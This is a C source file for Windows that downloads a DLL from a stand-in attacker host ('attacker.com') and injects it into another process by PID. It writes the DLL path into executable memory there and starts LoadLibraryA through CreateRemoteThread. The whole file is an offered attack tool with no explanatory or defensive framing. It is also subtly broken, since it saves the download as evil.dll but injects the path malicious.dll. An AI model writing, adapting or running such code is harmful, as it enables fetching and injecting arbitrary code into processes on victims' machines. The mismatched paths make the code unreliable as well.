#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <urlmon.h> // For URLDownloadToFile
#pragma comment(lib, "urlmon.lib")

const char* dllURL = "http://attacker.com/malicious.dll"; 

int main(int argc, char* argv[]) {
    // Download the DLL file
    HRESULT hr = URLDownloadToFile(NULL, dllURL, "C:\\Tools\\evil.dll", 0, NULL);
    if (FAILED(hr)) {
        printf("Failed to download DLL: 0x%x\n", hr);
        return 1;
    }

    // Now, continue with the injection process
    HANDLE phandle; // process handle
    HANDLE rthread; // remote thread
    LPVOID rbuffer; // remote buffer

    // Get a handle to kernel32.dll and retrieve the address of LoadLibraryA function
    HMODULE hKernel32 = GetModuleHandle("Kernel32");
    VOID* lb = GetProcAddress(hKernel32, "LoadLibraryA");

    // parse the process ID
    if (atoi(argv[1]) == 0) {
        printf("PID not found :( exiting...\n");
        return -1;
    }

    // open the target process
    printf("PID: %i", atoi(argv[1]));
    phandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

    // Allocate memory buffer in the target process for DLL path
    rbuffer = VirtualAllocEx(phandle, NULL, strlen("C:\\Tools\\malicious.dll") + 1, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    // Copy DLL file path to the allocated memory in the target process
    WriteProcessMemory(phandle, rbuffer, "C:\\Tools\\malicious.dll", strlen("C:\\Tools\\malicious.dll") + 1, NULL);

    // Create a remote thread in the target process to load the DLL
    rthread = CreateRemoteThread(phandle, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rbuffer, 0, NULL);
    CloseHandle(phandle);
    return 0;
}
